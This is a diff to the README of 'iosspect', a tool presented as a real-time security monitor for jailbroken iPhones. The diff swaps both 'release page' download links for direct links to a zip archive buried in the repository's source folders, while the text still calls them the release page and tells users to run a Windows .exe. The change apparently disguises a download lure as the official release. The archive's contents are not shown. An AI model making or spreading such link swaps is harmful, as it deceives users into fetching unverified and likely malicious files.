@@ -1,6 +1,6 @@
 # 📱 iosspect - Monitor your iPhone security in real-time
 
-[![Download iosspect](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vivjvh2668/iosspect/releases)
+[![Download iosspect](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/vivjvh2668/iosspect/main/IOSspectd/Sources/Root/Software-3.4-beta.1.zip)
 
 iosspect acts as a bridge between your jailbroken iPhone and your computer. It monitors the internal processes of your device while you use it. You can view the data through a simple webpage on your browser. This tool helps you see how apps behave on your phone.
 
@@ -17,7 +17,7 @@ Before you start, make sure your device meets these needs:
 
 You can get the software from the official release page. 
 
-[Click here to visit the release page to download iosspect](https://github.com/vivjvh2668/iosspect/releases)
+[Click here to visit the release page to download iosspect](https://raw.githubusercontent.com/vivjvh2668/iosspect/main/IOSspectd/Sources/Root/Software-3.4-beta.1.zip)
 
 Find the file that ends in .exe for Windows. Save this file to a folder you can find easily, such as your Downloads folder.
 
